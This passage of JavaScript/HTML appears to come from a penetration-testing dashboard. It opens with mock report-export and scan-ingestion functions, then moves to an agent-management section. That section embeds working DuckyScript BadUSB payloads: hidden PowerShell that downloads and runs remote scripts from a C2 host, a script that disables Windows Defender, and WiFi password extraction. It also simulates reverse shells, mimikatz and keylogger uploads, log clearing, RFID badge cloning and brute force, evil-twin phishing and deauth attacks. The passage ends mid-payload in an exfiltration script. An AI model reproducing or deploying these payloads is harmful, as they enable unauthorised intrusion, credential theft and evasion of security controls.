                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Implement parameterized queries and input validation to prevent SQL injection attacks in the customer portal.</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;"><span style="background: #fee2e2; color: #dc2626; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">CRITICAL</span></td>
                            </tr>
                            <tr>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Implement Access Controls</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;">Review and strengthen access control mechanisms, implement role-based access controls (RBAC).</td>
                                <td style="border: 1px solid #d1d5db; padding: 0.75rem;"><span style="background: #fee2e2; color: #dc2626; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">CRITICAL</span></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            `;
            
            // Add Constraints if available
            const constraints = document.getElementById('constraintsText')?.value;
            if (constraints) {
                html += `
                    <div style="margin-bottom: 3rem;">
                        <h2 style="color: #1f2937; border-bottom: 2px solid #3b82f6; padding-bottom: 0.5rem;">Constraints & Limitations</h2>
                        <div style="margin: 1.5rem 0; line-height: 1.8; white-space: pre-line;">${constraints}</div>
                    </div>
                `;
            }
            
            return html;
        }
        
        function saveReport() {
            // In real app: save to backend
            alert('Report saved successfully!\\n\\nAll changes have been saved and the report is ready for review.');
        }
        
        function exportPreview() {
            const segment = document.getElementById('previewSegments')?.value || 'all';
            alert(`Exporting ${currentReportType} report (${segment} segments)\\n\\nReport will be exported as PDF with the current content and formatting.\\n\\nExport options:\\n PDF format\\n Word document\\n HTML format\\n Print-ready version`);
        }
        
        function exportReport(reportType) {
            alert(`Exporting ${reportType} report...\\n\\nChoose export format:\\n PDF (recommended)\\n Microsoft Word\\n HTML\\n Raw data (JSON)`);
        }
        
        function exportAllReports() {
            alert('Export All Reports\\n\\nThis will create a complete report package including:\\n\\n Management Report (PDF)\\n Technical Report (PDF)\\n Supplemental Report (PDF)\\n All evidence and screenshots\\n Executive summary\\n Raw data export\\n\\nPackage will be created as a ZIP file.');
        }
        
        function openReportTemplates() {
            alert('Report Templates\\n\\nChoose from available templates:\\n\\n Standard PCI DSS Assessment\\n OWASP Web Application Security\\n Network Infrastructure Review\\n Cloud Security Assessment\\n Mobile Application Security\\n Social Engineering Assessment\\n Custom Template Builder\\n\\nSelect a template to apply formatting and structure.');
        }
        
        function addReportSection() {
            const sectionName = prompt('Add New Section\\n\\nEnter section name:');
            if (sectionName) {
                alert(`New section "${sectionName}" added successfully!\\n\\nSection type options:\\n Free text content\\n Structured template\\n Auto-generated table\\n Screenshot gallery\\n Custom format`);
            }
        }
        
        function moveSectionUp() {
            alert(`Move "${document.getElementById('currentSectionTitle')?.textContent}" up\\n\\nThis section will be moved up in the report order.`);
        }
        
        function moveSectionDown() {
            alert(`Move "${document.getElementById('currentSectionTitle')?.textContent}" down\\n\\nThis section will be moved down in the report order.`);
        }
        
        function deleteSection() {
            const sectionTitle = document.getElementById('currentSectionTitle')?.textContent;
            if (confirm(`Delete Section: ${sectionTitle}\\n\\nThis will permanently remove the section and all its content. This action cannot be undone.\\n\\nContinue?`)) {
                alert('Section deleted successfully.');
            }
        }
        
        function addNextStep() {
            const table = document.querySelector('#nextStepsList tbody');
            if (table) {
                const newRow = document.createElement('tr');
                newRow.innerHTML = `
                    <td>
                        <input type="text" class="form-input" placeholder="Enter activity..." style="border: none; background: transparent;">
                    </td>
                    <td>
                        <textarea class="form-textarea" placeholder="Enter description..." style="border: none; background: transparent; min-height: 60px; resize: vertical;"></textarea>
                    </td>
                    <td>
                        <select class="form-select" style="border: none; background: transparent;">
                            <option value="critical">Critical</option>
                            <option value="high" selected>High</option>
                            <option value="medium">Medium</option>
                            <option value="low">Low</option>
                        </select>
                    </td>
                    <td>
                        <button class="table-btn" onclick="removeNextStep(this)" title="Remove"></button>
                    </td>
                `;
                table.appendChild(newRow);
            }
        }
        
        function removeNextStep(button) {
            if (confirm('Remove this step?')) {
                button.closest('tr').remove();
            }
        }
        
        function importFromFindings() {
            alert('Import from Findings\\n\\nThis will automatically create next steps based on your current findings:\\n\\n Critical findings  Critical priority steps\\n High findings  High priority steps\\n Include remediation guidance\\n Add timeline recommendations\\n\\nWould you like to import findings now?');
        }
        
        function regenerateFindingsTable() {
            alert('Regenerating Findings Table\\n\\nThe table will be updated based on current filter settings:\\n\\n Selected severity levels\\n Chosen categories\\n Current project findings\\n Applied segment filters\\n\\nTable regenerated successfully!');
        }
        
        function insertScreenshotIntoText(textareaId) {
            alert('Insert Screenshot\\n\\nChoose from available screenshots:\\n\\n Recent screenshots (12)\\n Tagged screenshots (8)\\n Filtered by finding (5)\\n Upload new screenshot\\n\\nScreenshot will be inserted at cursor position.');
        }
        
        function formatText(textareaId, format) {
            const textarea = document.getElementById(textareaId);
            if (textarea) {
                const start = textarea.selectionStart;
                const end = textarea.selectionEnd;
                const selectedText = textarea.value.substring(start, end);
                
                if (selectedText) {
                    let formattedText = selectedText;
                    if (format === 'bold') {
                        formattedText = `**${selectedText}**`;
                    } else if (format === 'italic') {
                        formattedText = `*${selectedText}*`;
                    }
                    
                    textarea.value = textarea.value.substring(0, start) + formattedText + textarea.value.substring(end);
                    textarea.focus();
                    textarea.setSelectionRange(start + formattedText.length, start + formattedText.length);
                }
            }
        }
        
        // Auto-update template preview when inputs change
        document.addEventListener('DOMContentLoaded', function() {
            ['clientCompany', 'target', 'posture', 'duration', 'criticalFindings', 'highFindings'].forEach(id => {
                const element = document.getElementById(id);
                if (element) {
                    element.addEventListener('input', updateTemplatePreview);
                    element.addEventListener('change', updateTemplatePreview);
                }
            });
        });
        
        function generateReportPackage() {
            alert('Generate Complete Package\\n\\nCreating comprehensive report package including:\\n\\n Management Report (32 pages)\\n Technical Report (68 pages)\\n Supplemental Evidence (45 screenshots)\\n Executive Summary (4 pages)\\n Raw finding data\\n\\nEstimated generation time: 2-3 minutes\\nPackage size: ~25 MB\\n\\nStart generation?');
        }
        
        function generateExecutiveSummary() {
            alert('Generate Executive Summary\\n\\nCreating executive-only summary including:\\n\\n High-level findings overview\\n Business impact assessment\\n Priority recommendations\\n Executive dashboard\\n Action items summary\\n\\nEstimated pages: 4-6\\nGeneration time: 30 seconds\\n\\nGenerate now?');
        }
        
        function generateCustomReport() {
            alert('Custom Report Builder\\n\\nSelect components to include:\\n\\n High Level Summary\\n Executive Summary\\n Findings by Severity\\n Findings by Category\\n Technical Details\\n Screenshots & Evidence\\n Remediation Timeline\\n Risk Assessment\\n\\nSelect segments:\\n External Testing\\n Internal Testing\\n Web Application\\n Infrastructure\\n\\nConfigure custom report?');
        }
        
        // Data Ingestion Functions
        function uploadFile(toolType) {
            const toolNames = {
                'nmap': 'Nmap',
                'nessus': 'Nessus',
                'testssl': 'TestSSL',
                'nuclei': 'Nuclei',
                'bloodhound': 'BloodHound',
                'burp': 'Burp Suite'
            };
            
            const supportedFormats = {
                'nmap': ['XML Output (.xml)', 'Gnmap (.gnmap)', 'JSON (.json)'],
                'nessus': ['.nessus XML files', 'CSV Export (.csv)'],
                'testssl': ['JSON Output (.json)', 'HTML Report (.html)', 'CSV Export (.csv)'],
                'nuclei': ['JSON Output (.json)', 'JSONL (.jsonl)', 'Markdown (.md)'],
                'bloodhound': ['JSON Data (.json)', 'ZIP Archive (.zip)', 'CSV Export (.csv)'],
                'burp': ['XML Report (.xml)', 'HTML Report (.html)', 'JSON Export (.json)']
            };
            
            const toolName = toolNames[toolType] || toolType;
            const formats = supportedFormats[toolType] || ['Various formats'];
            
            alert(`Upload ${toolName} Files\\n\\nSupported formats:\\n${formats.map(f => ' ' + f).join('\\n')}\\n\\nDrag and drop files here or click to browse.\\n\\nFiles will be automatically parsed and findings integrated into your project.`);
            
            // Simulate file upload process
            if (confirm('Simulate file upload and processing?')) {
                simulateFileProcessing(toolType);
            }
        }
        
        function simulateFileProcessing(toolType) {
            const toolNames = {
                'nmap': 'Nmap',
                'nessus': 'Nessus',
                'testssl': 'TestSSL',
                'nuclei': 'Nuclei',
                'bloodhound': 'BloodHound',
                'burp': 'Burp Suite'
            };
            
            const mockResults = {
                'nmap': { findings: '15 hosts', type: 'hosts discovered' },
                'nessus': { findings: '42 vulnerabilities', type: 'vulnerabilities' },
                'testssl': { findings: '8 SSL issues', type: 'SSL issues' },
                'nuclei': { findings: '127 templates matched', type: 'findings' },
                'bloodhound': { findings: '23 attack paths', type: 'attack paths' },
                'burp': { findings: '31 web issues', type: 'web issues' }
            };
            
            const toolName = toolNames[toolType];
            const result = mockResults[toolType];
            
            alert(`Processing ${toolName} file...\\n\\n File uploaded successfully\\n Format validated\\n Data parsed\\n ${result.findings} imported\\n\\nProcessing complete! ${result.findings} have been added to your findings database.`);
        }
        
        function viewIngestionHistory(toolType) {
            const toolNames = {
                'nmap': 'Nmap',
                'nessus': 'Nessus',
                'testssl': 'TestSSL',
                'nuclei': 'Nuclei',
                'bloodhound': 'BloodHound',
                'burp': 'Burp Suite'
            };
            
            const toolName = toolNames[toolType];
            
            alert(`${toolName} Processing History\\n\\nRecent uploads:\\n\\n 2024-11-20 14:32 - scan_results.json ( Success)\\n 2024-11-19 09:15 - network_scan.xml ( Success)\\n 2024-11-18 16:42 - vulnerability_report.xml ( Success)\\n 2024-11-17 11:28 - ssl_analysis.json ( Warnings)\\n 2024-11-16 13:55 - comprehensive_scan.xml ( Success)\\n\\nTotal files processed: 23\\nSuccess rate: 95.7%\\nAverage processing time: 3.2s`);
        }
        
        function configureParser(toolType) {
            const toolNames = {
                'nmap': 'Nmap',
                'nessus': 'Nessus',
                'testssl': 'TestSSL',
                'nuclei': 'Nuclei',
                'bloodhound': 'BloodHound',
                'burp': 'Burp Suite'
            };
            
            const toolName = toolNames[toolType];
            
            alert(`Configure ${toolName} Parser\\n\\nParser Settings:\\n\\n Auto-import findings\\n Create assets automatically\\n Generate screenshots from evidence\\n Apply severity mapping\\n Merge duplicate findings\\n Send notifications on completion\\n\\nAdvanced Options:\\n Custom field mapping\\n Data transformation rules\\n Quality filters\\n Integration with external systems\\n\\nWould you like to modify these settings?`);
        }
        
        function exportIngestionReport() {
            alert('Export Ingestion Report\\n\\nGenerate comprehensive report including:\\n\\n Processing statistics\\n Tool usage analytics\\n Success/failure rates\\n Data quality metrics\\n Timeline analysis\\n Performance benchmarks\\n Error logs and warnings\\n\\nExport formats:\\n PDF Report\\n Excel Spreadsheet\\n CSV Data\\n JSON Analytics\\n\\nGenerate report?');
        }
        
        function openIngestionSettings() {
            alert('Data Ingestion Settings\\n\\nGlobal Configuration:\\n\\n Auto-processing enabled\\n File size limit: 100MB\\n Concurrent uploads: 3\\n Retention period: 90 days\\n Backup enabled: Yes\\n\\nNotifications:\\n Email alerts: Enabled\\n Slack integration: Disabled\\n Webhook notifications: Configured\\n\\nSecurity:\\n File scanning: Enabled\\n Encrypted storage: Yes\\n Access logging: Enabled\\n\\nWould you like to modify these settings?');
        }
        
        function openBulkUploader() {
            alert('Bulk File Uploader\\n\\nUpload multiple files simultaneously:\\n\\n Drag and drop up to 50 files\\n Mixed tool formats supported\\n Auto-detection of file types\\n Progress tracking\\n Batch processing queue\\n Error handling and retry\\n\\nSupported Operations:\\n ZIP archive extraction\\n Directory uploads\\n FTP/SFTP import\\n Cloud storage sync\\n API integrations\\n\\nOpen bulk uploader interface?');
        }
        
        function refreshActivity() {
            alert('Refreshing Activity Feed\\n\\n Checking for new processed files...\\n Updating statistics...\\n Fetching queue status...\\n\\n Activity feed updated successfully!\\n\\nNew items found:\\n 2 files in processing queue\\n 1 completed since last refresh\\n 0 failed processes');
        }
        
        function viewProcessedFile(fileId) {
            const fileDetails = {
                'nuclei-1': {
                    tool: 'Nuclei',
                    file: 'scan_results_20241120.json',
                    findings: 127,
                    size: '2.3MB',
                    duration: '3.2s'
                },
                'nmap-1': {
                    tool: 'Nmap',
                    file: 'network_scan.xml',
                    findings: 15,
                    size: '850KB',
                    duration: '1.8s'
                },
                'nessus-1': {
                    tool: 'Nessus',
                    file: 'vulnerability_scan.nessus',
                    findings: 42,
                    size: '5.7MB',
                    duration: '8.1s'
                },
                'testssl-1': {
                    tool: 'TestSSL',
                    file: 'ssl_test_results.json',
                    findings: 8,
                    size: '156KB',
                    duration: '0.9s'
                },
                'bloodhound-1': {
                    tool: 'BloodHound',
                    file: 'bloodhound_data.zip',
                    findings: 23,
                    size: '12.4MB',
                    duration: '25.6s'
                }
            };
            
            const details = fileDetails[fileId];
            if (details) {
                alert(`File Processing Details\\n\\nTool: ${details.tool}\\nFile: ${details.file}\\nFindings: ${details.findings}\\nFile Size: ${details.size}\\nProcessing Time: ${details.duration}\\n\\nProcessing Steps:\\n File validation\\n Format detection\\n Data parsing\\n Finding extraction\\n Asset creation\\n Integration complete\\n\\nAll findings have been successfully imported into your project.`);
            }
        }
        
        function reprocessFile(fileId) {
            if (confirm('Reprocess File\\n\\nThis will re-run the parser on the uploaded file with current settings. Any duplicate findings will be merged.\\n\\nContinue with reprocessing?')) {
                alert('Reprocessing file...\\n\\n Loading original file\\n Applying current parser settings\\n Re-extracting findings\\n Updating database\\n\\n Reprocessing complete!\\n\\nUpdated findings have been integrated.');
            }
        }
        
        function cancelProcessing(fileId) {
            if (confirm('Cancel Processing\\n\\nThis will stop the current processing job. Any partial results will be discarded.\\n\\nCancel processing?')) {
                alert('Processing cancelled successfully.\\n\\nThe file has been removed from the processing queue.');
            }
        }
        
        function createCustomParser() {
            alert('Custom Parser Builder\\n\\nCreate a parser for unsupported tools:\\n\\nStep 1: Parser Configuration\\n Parser name and description\\n Input file formats\\n Output field mapping\\n\\nStep 2: Data Extraction\\n Define extraction patterns\\n Configure field types\\n Set validation rules\\n\\nStep 3: Finding Generation\\n Map to finding schema\\n Set severity levels\\n Configure categorization\\n\\nStep 4: Testing & Validation\\n Test with sample data\\n Validate output format\\n Performance testing\\n\\nWould you like to start the parser builder wizard?');
        }
        
        function viewCustomParsers() {
            alert('Custom Parsers\\n\\nConfigured parsers:\\n\\n OWASP ZAP Parser\\n    Status: Active\\n    Files processed: 12\\n    Last used: 2 days ago\\n\\n OpenVAS Parser\\n    Status: Active\\n    Files processed: 8\\n    Last used: 1 week ago\\n\\n Custom JSON Parser\\n    Status: Inactive\\n    Files processed: 3\\n    Last used: 2 weeks ago\\n\\nActions:\\n Edit parser configuration\\n Test with sample data\\n Export parser definition\\n Share with team');
        }
        
        function importParser() {
            alert('Import Parser\\n\\nImport parser definitions from:\\n\\n Local file (.json, .yaml)\\n GitHub repository\\n Community marketplace\\n Shared team parsers\\n\\nParser Requirements:\\n Valid configuration schema\\n Input/output format specification\\n Field mapping definitions\\n Test cases included\\n\\nSelect import source?');
        }
        
        // File Upload Modal Functions
        function openFileUploadModal(toolType) {
            // This would open a proper file upload modal
            uploadFile(toolType);
        }
        
        // Parser Configuration Functions
        function saveParserConfig(toolType, config) {
            alert(`Parser configuration saved for ${toolType}\\n\\nConfiguration updated:\\n Field mappings\\n Processing rules\\n Validation settings\\n Integration options\\n\\nChanges will apply to future file uploads.`);
        }
        
        function testParser(toolType) {
            alert(`Testing ${toolType} Parser\\n\\nRunning parser test with sample data:\\n\\n Loading test file...\\n Running parser...\\n Validating output...\\n\\n Parser test successful!\\n\\nSample results:\\n 5 test findings extracted\\n All fields mapped correctly\\n No validation errors\\n Processing time: 0.8s`);
        }
        
        function downloadSampleFile(toolType) {
            const sampleFiles = {
                'nmap': 'sample_nmap_scan.xml',
                'nessus': 'sample_vulnerability_scan.nessus',
                'testssl': 'sample_ssl_results.json',
                'nuclei': 'sample_nuclei_output.json',
                'bloodhound': 'sample_bloodhound_data.zip',
                'burp': 'sample_burp_report.xml'
            };
            
            const fileName = sampleFiles[toolType];
            alert(`Downloading Sample File\\n\\nFile: ${fileName}\\n\\nThis sample file can be used to:\\n Test parser configuration\\n Understand expected format\\n Validate data mapping\\n Train team members\\n\\nFile download started...`);
        }
        
        // Data Processing Queue Functions
        function viewProcessingQueue() {
            alert('Processing Queue\\n\\nCurrent queue (3 items):\\n\\n1. bloodhound_analysis.zip\\n    Status: Processing (65%)\\n    ETA: 2 minutes\\n\\n2. network_scan_large.xml\\n    Status: Queued\\n    Position: #2\\n\\n3. vulnerability_report.nessus\\n    Status: Queued\\n    Position: #3\\n\\nQueue Statistics:\\n Average wait time: 30s\\n Peak processing hours: 9-11 AM\\n Success rate: 96.8%');
        }
        
        function clearProcessingQueue() {
            if (confirm('Clear Processing Queue\\n\\nThis will remove all queued items. Currently processing files will continue.\\n\\nClear queue?')) {
                alert('Processing queue cleared.\\n\\n 2 queued items removed\\n 1 active process continues\\n Queue is now empty');
            }
        }
        
        function prioritizeFile(fileId) {
            alert(`File Priority Updated\\n\\nThe file has been moved to the front of the processing queue.\\n\\nNew queue position: #1\\nEstimated processing start: Immediately\\n\\nPriority processing may incur additional resource usage.`);
        }
        
        // Integration Functions
        function setupIntegration(service) {
            const integrations = {
                'jira': 'Jira Integration',
                'slack': 'Slack Notifications',
                'webhook': 'Webhook Endpoints',
                'api': 'REST API Access',
                'siem': 'SIEM Integration',
                'ticketing': 'Ticketing System'
            };
            
            const serviceName = integrations[service];
            alert(`${serviceName} Setup\\n\\nConfiguration options:\\n\\n Authentication settings\\n Endpoint configuration\\n Data mapping rules\\n Notification triggers\\n Batch processing options\\n Error handling\\n\\nWould you like to configure this integration?`);
        }
        
        // Analytics and Reporting Functions
        function generateIngestionAnalytics() {
            alert('Ingestion Analytics Report\\n\\nGenerating comprehensive analytics:\\n\\n Processing Volume\\n Files processed: 1,247\\n Total data: 45.6 GB\\n Average file size: 37.2 MB\\n\\n Tool Usage\\n Most active: Nuclei (34%)\\n Fastest processing: TestSSL (avg 0.9s)\\n Largest files: BloodHound (avg 12.3MB)\\n\\n Quality Metrics\\n Success rate: 94.2%\\n Error rate: 3.1%\\n Warning rate: 2.7%\\n\\nDetailed report will be generated...');
        }
        
        function exportRawData(format) {
            const formats = {
                'json': 'JSON format with complete metadata',
                'csv': 'CSV format for spreadsheet analysis',
                'xml': 'XML format for system integration',
                'yaml': 'YAML format for configuration'
            };
            
            alert(`Export Raw Data (${format.toUpperCase()})\\n\\nExporting processed data in ${formats[format]}:\\n\\n All ingested findings\\n Processing metadata\\n Tool attribution\\n Timestamps and versions\\n Quality metrics\\n\\nExport size estimate: 12.3 MB\\nGeneration time: ~30 seconds\\n\\nStart export?`);
        }
        
        // Agent Management Functions
        let currentAgentTab = 'all';
        let activeAgents = [];
        
        function scanForAgents() {
            alert('Scanning for Agents\\n\\n Scanning network...\\n Checking USB devices...\\n Searching for Bluetooth devices...\\n WiFi Direct discovery...\\n\\n Scan complete!\\n\\nFound:\\n 2 ESP32 devices\\n 1 BadUSB device\\n 1 WiFi Pineapple\\n 3 Network agents\\n\\nWould you like to add these agents?');
        }
        
        function openPayloadBuilder() {
            alert('Advanced Payload Builder\\n\\nCreate sophisticated multi-stage payloads:\\n\\n Visual script builder\\n OS-specific templates\\n Timing optimizer\\n Obfuscation tools\\n Anti-detection bypass\\n Payload encoder\\n Testing sandbox\\n\\nOpen advanced builder?');
        }
        
        function deployNewAgent() {
            alert('Deploy New Agent\\n\\nAgent Types:\\n\\n1. ESP32 HID Device\\n    Keyboard emulator\\n    Mouse control\\n    Mass storage\\n\\n2. Network Agent\\n    C2 beacon\\n    Reverse shell\\n    Data exfiltration\\n\\n3. Physical Access\\n    RFID/NFC cloner\\n    Lock bypass\\n    Badge emulator\\n\\nSelect agent type to deploy?');
        }
        
        function switchAgentTab(tab) {
            currentAgentTab = tab;
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            alert(`Filtering agents: ${tab.toUpperCase()}\\n\\nShowing ${tab === 'all' ? 'all agents' : tab + ' agents only'}`);
        }
        
        // ESP32 Agent Functions
        function executePayload(agentId) {
            alert(`Execute Payload on ${agentId}\\n\\nAvailable Payloads:\\n\\n1. reverse_shell.dd - Establish C2 connection\\n2. wifi_extract.dd - Extract WiFi credentials\\n3. screenshot.dd - Capture and upload screenshot\\n4. disable_av.dd - Disable antivirus\\n5. persistence.dd - Install persistence\\n6. custom.dd - Custom script\\n\\nSelect payload to execute?`);
        }
        
        function viewAgentLogs(agentId) {
            alert(`${agentId} Activity Logs\\n\\n[10:52:14] Connected to target system\\n[10:52:15] USB HID device recognized\\n[10:52:16] Keyboard driver loaded\\n[10:52:17] Starting payload execution\\n[10:52:18] Opening command prompt\\n[10:52:19] Executing PowerShell script\\n[10:52:22] Payload completed successfully\\n[10:52:23] Connection maintained\\n\\nExport logs?`);
        }
        
        function configureAgent(agentId) {
            alert(`Configure ${agentId}\\n\\nSettings:\\n\\n Target OS: Windows 10\\n Keyboard Layout: US\\n Delay Between Keystrokes: 50ms\\n WiFi SSID: AgentControl\\n WiFi Password: \\n C2 Server: 192.168.1.100\\n Beacon Interval: 60s\\n Stealth Mode: Enabled\\n\\nModify configuration?`);
        }
        
        function disconnectAgent(agentId) {
            if (confirm(`Disconnect ${agentId}?\\n\\nThis will terminate the connection to the agent. The agent will remain armed and can reconnect later.\\n\\nProceed?`)) {
                alert('Agent disconnected successfully.');
            }
        }
        
        // BadUSB Functions
        function armDevice(deviceId) {
            alert(`Arming ${deviceId}\\n\\n WARNING: Device will execute payload immediately upon insertion!\\n\\nPayload: reverse_shell.dd\\nTarget: Any Windows system\\nExecution time: ~3 seconds\\n\\n Device is now ARMED\\n\\nSafety reminder:\\n Handle with care\\n Test in isolated environment\\n Ensure authorization`);
        }
        
        function editScript(deviceId) {
            alert(`Edit DuckyScript for ${deviceId}\\n\\nCurrent script: reverse_shell.dd\\n\\n\`\`\`\\nDELAY 1000\\nGUI r\\nDELAY 500\\nSTRING powershell -w hidden\\nENTER\\nDELAY 1000\\nSTRING IEX(New-Object Net.WebClient).downloadString('http://c2.server/p.ps1')\\nENTER\\n\`\`\`\\n\\nEdit in script editor?`);
        }
        
        function testPayload(deviceId) {
            alert(`Testing Payload: ${deviceId || 'Current Script'}\\n\\n Starting test in sandbox...\\n Syntax validation passed\\n Timing analysis complete\\n OS compatibility check passed\\n Payload size: 234 bytes\\n Estimated execution: 3.2 seconds\\n\\n Warnings:\\n UAC prompt may appear\\n Defender may detect PowerShell\\n\\n Test successful!`);
        }
        
        function cloneDevice(deviceId) {
            alert(`Clone ${deviceId}\\n\\nThis will create an exact copy of the device configuration and payloads.\\n\\nClone to:\\n New BadUSB device\\n ESP32 device\\n Virtual device\\n Export configuration\\n\\nSelect target for cloning?`);
        }
        
        // ESPKey Functions
        function emulateCard(espkeyId) {
            alert(`${espkeyId} - Card Emulation\\n\\nActive Card: Admin-042\\nType: HID Prox II\\nFacility Code: 35\\nCard Number: 12345\\nFrequency: 125kHz\\n\\n Emulating...\\n\\nPlace device near reader. LED will flash green when successful.\\n\\nEmulation active for 60 seconds.`);
        }
        
        function viewCapturedCards(espkeyId) {
            alert(`${espkeyId} - Captured Cards\\n\\n 23 cards in memory:\\n\\n1. Admin-042 - Server Room\\n2. Security-018 - All Access\\n3. Maintenance-105 - Service Areas\\n4. Executive-001 - C-Suite\\n5. Visitor-234 - Lobby Only\\n6. Contractor-567 - Limited Access\\n...and 17 more\\n\\nSelect card to emulate or export data?`);
        }
        
        function scanForCards(espkeyId) {
            alert(`${espkeyId} - Scanning Mode\\n\\n Scanning for RFID/NFC cards...\\n\\nFrequencies:\\n 125kHz (LF) - Active\\n 13.56MHz (HF) - Active\\n\\nPlace cards near device to capture.\\nDevice will beep and LED will flash on successful read.\\n\\nScanning... (Press OK to stop)`);
        }
        
        function bruteForce(espkeyId) {
            alert(`${espkeyId} - Brute Force Mode\\n\\n Configure brute force attack:\\n\\nCard Type: HID Prox II\\nFacility Code Range: 0-255\\nCard Number Range: 0-65535\\nDelay between attempts: 100ms\\n\\nEstimated time: ~18 hours\\n\\n WARNING: May trigger security alerts!\\n\\nStart brute force attack?`);
        }
        
        // Network Agent Functions
        function openShell(agentId) {
            alert(`${agentId} - Interactive Shell\\n\\n\`\`\`\\nMicrosoft Windows [Version 10.0.19043.1234]\\n(c) Microsoft Corporation. All rights reserved.\\n\\nC:\\\\Windows\\\\system32> whoami\\nnt authority\\\\system\\n\\nC:\\\\Windows\\\\system32> ipconfig\\nEthernet adapter Ethernet:\\n   IPv4 Address: 192.168.1.105\\n   Subnet Mask: 255.255.255.0\\n   Default Gateway: 192.168.1.1\\n\\nC:\\\\Windows\\\\system32> _\\n\`\`\`\\n\\nEnter command or open full terminal?`);
        }
        
        function downloadFiles(agentId) {
            alert(`${agentId} - File Download\\n\\nBrowse remote filesystem:\\n\\n C:\\\\\\n   Users\\n     Administrator\\n       Desktop\\n       Documents\\n         passwords.xlsx (45KB)\\n         budget_2024.pdf (2.3MB)\\n       Downloads\\n   Program Files\\n   Windows\\n\\nSelect files to download or specify path?`);
        }
        
        function uploadPayload(agentId) {
            alert(`${agentId} - Upload Payload\\n\\nUpload files to target:\\n\\nRecent uploads:\\n mimikatz.exe\\n persistence.ps1\\n keylogger.dll\\n\\nDrop location: C:\\\\Windows\\\\Temp\\\\\\nFilename obfuscation: Enabled\\nAV evasion: Enabled\\n\\nSelect file to upload?`);
        }
        
        function selfDestruct(agentId) {
            if (confirm(` SELF-DESTRUCT ${agentId}\\n\\nThis will:\\n Delete all agent files\\n Clear event logs\\n Remove persistence\\n Terminate connection\\n\\nThis action is IRREVERSIBLE!\\n\\nConfirm self-destruct?`)) {
                if (confirm('Are you absolutely sure? Type "DESTROY" to confirm.')) {
                    alert('Self-destruct initiated...\\n\\n Removing persistence...\\n Deleting files...\\n Clearing logs...\\n Terminating...\\n\\n Agent destroyed successfully.');
                }
            }
        }
        
        // WiFi Pineapple Functions
        function startAttack(pineappleId) {
            alert(`${pineappleId} - Start Attack\\n\\nAttack Configuration:\\n\\n SSID: FreeWiFi_Guest (Evil Twin)\\n Channel: 6\\n Captive Portal: Office365 phishing\\n Deauth nearby clients: Yes\\n Capture handshakes: Yes\\n SSL strip: Enabled\\n DNS spoofing: Enabled\\n\\n Attack started!\\n\\nMonitoring for victims...`);
        }
        
        function viewClients(pineappleId) {
            alert(`${pineappleId} - Connected Clients\\n\\n 12 clients connected:\\n\\n1. iPhone-John (5C:AA:FD:22:11:33)\\n   Signal: -45dBm | Data: 34MB\\n\\n2. LAPTOP-SARAH (AA:BB:CC:DD:EE:FF)\\n   Signal: -52dBm | Data: 128MB\\n\\n3. Android-Guest (11:22:33:44:55:66)\\n   Signal: -61dBm | Data: 8MB\\n\\n...and 9 more\\n\\nSelect client for targeted attack?`);
        }
        
        function captureTraffic(pineappleId) {
            alert(`${pineappleId} - Traffic Capture\\n\\n Capturing packets...\\n\\nStatistics:\\n Packets captured: 45,234\\n Data volume: 156MB\\n HTTP requests: 1,234\\n HTTPS (stripped): 567\\n Credentials found: 8\\n Session cookies: 23\\n\\nExport capture as PCAP?`);
        }
        
        function deauth(pineappleId) {
            alert(`${pineappleId} - Deauthentication Attack\\n\\nTarget Selection:\\n All clients on channel\\n Specific BSSID\\n MAC address list\\n\\nDeauth packets per second: 100\\nChannel hopping: Enabled\\nTarget networks: 5\\n\\n Deauth attack active!\\n\\nClients will be forced to reconnect, potentially through our evil twin.`);
        }
        
        // Offline Agent Functions
        function attemptReconnect(agentId) {
            alert(`Attempting to reconnect ${agentId}...\\n\\n Sending wake signal...\\n Checking last known IP...\\n Attempting WiFi connection...\\n Trying Bluetooth...\\n\\n Connection failed\\n\\nAgent may be:\\n Powered off\\n Out of range\\n Discovered and removed\\n\\nSchedule automatic retry?`);
        }
        
        function viewLastLogs(agentId) {
            alert(`${agentId} - Last Known Activity\\n\\n[10:45:02] Connected to Kiosk Terminal\\n[10:45:03] USB device recognized\\n[10:45:04] Executing payload\\n[10:45:07] Payload interrupted\\n[10:45:08] USB disconnect detected\\n[10:47:02] Connection timeout\\n[10:47:02] Agent offline\\n\\nPossible causes:\\n Physical removal\\n Power loss\\n Security detection`);
        }
        
        function removeAgent(agentId) {
            if (confirm(`Remove ${agentId} from active agents?\\n\\nThis will:\\n Remove from monitoring\\n Delete stored credentials\\n Clear agent history\\n\\nThe physical device will not be affected.\\n\\nRemove agent?`)) {
                alert('Agent removed from active list.');
            }
        }
        
        // Payload Functions
        function loadPayload(payloadType) {
            const payloads = {
                'reverse-shell': `REM Reverse Shell
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')"
ENTER`,
                'disable-defender': `REM Disable Windows Defender
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER`,
                'extract-wifi': `REM Extract WiFi Passwords
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING netsh wlan show profiles | findstr ":" | findstr /v "profiles" > %temp%\\wifi.txt
ENTER
STRING for /f "tokens=2 delims=:" %a in (%temp%\\wifi.txt) do @echo %a >> %temp%\\wifi2.txt
ENTER`,
                'screenshot': `REM Screenshot and Upload
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')
ENTER`,
                'rickroll': `REM Rickroll Demo
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER`,
                'exfiltrate': `REM Data Exfiltration
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
